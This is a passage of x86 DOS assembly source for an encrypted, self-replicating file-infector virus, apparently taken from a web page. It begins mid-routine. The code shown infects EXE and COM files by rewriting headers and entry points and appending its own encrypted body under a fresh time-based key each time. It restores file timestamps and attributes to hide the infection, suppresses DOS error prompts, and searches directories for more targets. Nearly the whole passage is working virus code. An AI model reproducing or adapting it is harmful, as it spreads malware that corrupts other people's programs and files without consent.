          mov  dx, es                   ; to DX:AX
          push ax
          push dx

          sub  ax, bx                   ; Subtract header size from
          sbb  dx, 0                    ; file size

          mov  cx, 10h                  ; Convert to segment:offset
          div  cx                       ; form

          mov  word ptr [bp+buffer+14h], dx ; New entry point
          mov  word ptr [bp+buffer+16h], ax

          mov  word ptr [bp+buffer+0Eh], ax ; and stack
          mov  word ptr [bp+buffer+10h], id

          pop  dx                       ; get file length
          pop  ax

          add  ax, heap-decrypt         ; add virus size
          adc  dx, 0

          mov  cl, 9
          push ax
          shr  ax, cl
          ror  dx, cl
          stc
          adc  dx, ax
          pop  ax
          and  ah, 1                    ; mod 512

          mov  word ptr [bp+buffer+4], dx ; new file size
          mov  word ptr [bp+buffer+2], ax

          push cs                       ; restore ES
          pop  es

          push word ptr [bp+buffer+14h] ; needed later
          mov  cx, 1ah
          jmp  short finishinfection
infect_com:                             ; ax = filesize
          mov  cx,3
          sub  ax,cx
          lea  si,[bp+offset buffer]
          lea  di,[bp+offset save3]
          movsw
          movsb
          mov  byte ptr [si-3],0e9h
          mov  word ptr [si-2],ax
          add  ax,103h
          push ax                       ; needed later
finishinfection:
          push cx                       ; Save # bytes to write
          xor  cx,cx                    ; Clear attributes
          call attributes               ; Set file attributes

          mov  al,2
          call open

          mov  ah,40h                   ; Write to file
          lea  dx,[bp+buffer]           ; Write from buffer
          pop  cx                       ; cx bytes
          int  21h

          mov  ax,4202h                 ; Move file pointer
          xor  cx,cx                    ; to end of file
          cwd                           ; xor dx,dx
          int  21h

          mov  ah,2ch                   ; Get current time
          int  21h                      ; dh=sec,dl=1/100 sec
          mov  [bp+decrypt_value],dx    ; Set new encryption value
          lea  di,[bp+code_store]
          mov  ax,5355h                 ; push bp,push bx
          stosw
          lea  si,[bp+decrypt]          ; Copy encryption function
          mov  cx,startencrypt-decrypt  ; Bytes to move
          push si                       ; Save for later use
          push cx
          rep  movsb

          lea    si,[bp+write]          ; Copy writing function
          mov    cx,endwrite-write      ; Bytes to move
          rep    movsb
          pop    cx
          pop    si
          pop    dx                     ; Entry point of virus
          push   di
          push   si
          push   cx
          rep    movsb                  ; Copy decryption function
          mov    ax,5b5dh               ; pop bx,pop bp
          stosw
          mov    al,0c3h                ; retn
          stosb

          add    dx,offset startencrypt - offset decrypt ; Calculate new
          mov    word ptr [bp+patch_startencrypt+1],dx ; starting offset of
          call   code_store             ; decryption
          pop    cx
          pop    di
          pop    si
          rep    movsb                  ; Restore decryption function

          mov  ax,5701h                 ; Restore creation date/time
          mov  cx,word ptr [bp+newDTA+16h] ; time
          mov  dx,word ptr [bp+newDTA+18h] ; date
          int  21h

          mov  ah,3eh                   ; Close file
          int  21h

          mov ch,0
          mov cl,byte ptr [bp+newDTA+15h] ; Restore original
          call attributes               ; attributes

          dec  byte ptr [bp+numinfec]   ; One mo infection
          jnz  mo_infections            ; Not enough
          pop  ax                       ; remove call from stack
          jmp  done_infections
mo_infections: jmp find_next

open:
          mov  ah,3dh
          lea  dx,[bp+newDTA+30]        ; filename in DTA
          int  21h
          xchg ax,bx
          ret

attributes:
          mov  ax,4301h                 ; Set attributes to cx
          lea  dx,[bp+newDTA+30]        ; filename in DTA
          int  21h
          ret

write:
          pop  bx                       ; Restore file handle
          pop  bp                       ; Restore relativeness
          mov  ah,40h                   ; Write to file
          lea  dx,[bp+decrypt]          ; Concatenate virus
          mov  cx,heap-decrypt          ; # bytes to write
          int  21h
          push bx
          push bp
endwrite:

int24:                                  ; New int 24h (error) handler
          mov  al,3                     ; Fail call
          iret                          ; Return control

exe_mask            db '*.exe',0
com_mask            db '*.com',0
dot_dot             db '..',0
heap:                                   ; Variables not in code
; The following code is the buffer for the write function
code_store:         db (startencrypt-decrypt)*2+(endwrite-write)+1 dup (?)
oldint24            dd ?                ; Storage for old int 24h handler      
backslash           db ?
origdir             db 64 dup (?)       ; Current directory buffer             
newDTA              db 43 dup (?)       ; Temporary DTA                        
numinfec            db ?                ; Infections this run                  
buffer              db 1ah dup (?)      ; read buffer                          
endheap:                                ; End of virus
end       entry_point

</textarea></td></tr></table></body></html>
